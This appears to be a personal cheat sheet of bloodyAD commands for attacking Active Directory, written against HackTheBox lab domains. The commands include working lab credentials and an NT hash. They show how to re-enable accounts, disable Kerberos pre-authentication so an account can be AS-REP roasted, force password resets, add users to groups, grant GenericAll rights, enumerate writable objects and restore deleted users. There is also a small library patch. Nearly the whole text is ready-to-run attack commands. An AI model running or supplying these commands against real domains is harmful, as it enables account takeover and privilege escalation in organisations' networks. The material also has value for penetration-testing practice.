#### Enable Account

```bash
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.129.199.135 -u "p.rosa" -p Rosaisbest123 -k remove uac SVC_SQL -f ACCOUNTDISABLE
```
#### Enable ASREP on an Account

```bash
bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.129.199.135 -u "p.rosa" -p Rosaisbest123 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
```
#### Change Users Password

```bash
bloodyAD -d domain.local --host x.x.x.x -u username -p password set password target_user new_password
```
#### Add User to a group

```bash
bloodyAD -d domain.local --host x.x.x.x -u username -p password add groupMember 'Remote Management Users' user_to_add
```
#### Add GenericAll to a user account

```bash
bloodyAD -d haze.htb --host 10.129.232.50 -u 'haze-IT-backup$' -p :4de830d1d58c14e241aff55f82ecdba1 add genericAll 'SUPPORT_SERVICES' 'haze-IT-backup$'
```
#### Remove from group

```bash
bloodyAD -d domain.local --host x.x.x.x -u username -p password remove groupMember 'target_group' 'group_to_remove'
```
#### View writable objected

```bash
bloodyAD --host dc01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb get writable {--detail}
```
#### Bloodhound

```bash
bloodyAD --host dc01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb get bloodhound
```

#### Restore deleted user

```bash
grep -n "to_bytes()" ~/.local/lib/python3.10/site-packages/badldap/protocol/query.py
125:				byte_str += int(value[i + 1: i + 3], 16).to_bytes()
cp ~/.local/lib/python3.10/site-packages/badldap/protocol/query.py ~/.local/lib/python3.10/site-packages/badldap/protocol/query.py.bak

sed -i 's/\.to_bytes()/\.to_bytes(1, "big")/' ~/.local/lib/python3.10/site-packages/badldap/protocol/query.py

grep -n "to_bytes" ~/.local/lib/python3.10/site-packages/badldap/protocol/query.py
125:				byte_str += int(value[i + 1: i + 3], 16).to_bytes(1, "big")


bloodyAD --host dc01.checkpoint.htb -k -u alex.turner -d checkpoint.htb set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```
